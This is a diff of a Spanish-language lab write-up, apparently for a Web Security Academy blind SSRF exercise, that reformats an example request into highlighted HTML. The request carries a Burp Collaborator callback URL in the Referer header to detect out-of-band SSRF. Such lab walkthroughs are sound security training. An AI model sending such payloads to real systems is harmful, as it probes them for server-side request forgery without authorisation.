@@ -18,12 +18,13 @@ tags:
 - **Entonces:** cambia el objetivo. Primero **confirmar que el SSRF existe** con un canal **out-of-band** (Burp **Collaborator**), porque no lo podés "ver".
 
 ## Cómo explotarlo
+
+> 🟡 <mark>Resaltado</mark> = lo que reemplazás vos (target/collab/IP) + el **payload** del ataque (URL interna / Referer / User-Agent).
+
 Generá un payload de Collaborator y ponelo en el **`Referer`** de una request a una página de producto:
-```http
-GET /product?productId=1 HTTP/1.1
-Host: LAB.web-security-academy.net
-Referer: http://TU-SUBDOMINIO.oastify.com
-```
+<pre class="payload"><code>GET /product?productId=1 HTTP/1.1
+Host: <mark>LAB.web-security-academy.net</mark>
+Referer: <mark>http://TU-SUBDOMINIO.oastify.com</mark></code></pre>
 En Burp → **Collaborator → Poll now**.
 
 ## Verificación
